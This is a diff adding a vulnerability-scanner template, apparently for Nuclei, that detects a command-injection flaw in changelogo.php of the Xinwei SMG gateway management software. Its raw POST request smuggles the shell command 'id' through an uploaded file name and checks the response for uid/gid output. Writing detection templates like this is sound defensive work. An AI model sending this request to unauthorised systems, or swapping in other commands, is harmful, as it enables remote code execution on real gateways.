@@ -1,0 +1,42 @@
+id: SMG-changelogo-rce
+
+info:
+  name: 杭州新威数字信息SMG网关管理软件 changelogo.php 命令执行漏洞
+  author: SMG
+  severity: critical
+  tags: SMG
+
+http:
+  - raw:
+      - |
+        POST /changelogo.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1v98KI1jc9w1bG97
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8
+
+        ------WebKitFormBoundary1v98KI1jc9w1bG97
+        Content-Disposition: form-data; name="file"; filename=";id;.gif"
+        Content-Type: image/gif
+        
+        123321
+        
+        ------WebKitFormBoundary1v98KI1jc9w1bG97
+        Content-Disposition: form-data; name="test"
+        
+        
+        ------WebKitFormBoundary1v98KI1jc9w1bG97
+        Content-Disposition: form-data; name="upload"
+        
+        Apply
+        ------WebKitFormBoundary1v98KI1jc9w1bG97--
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
+      - type: status
+        status:
+          - 200
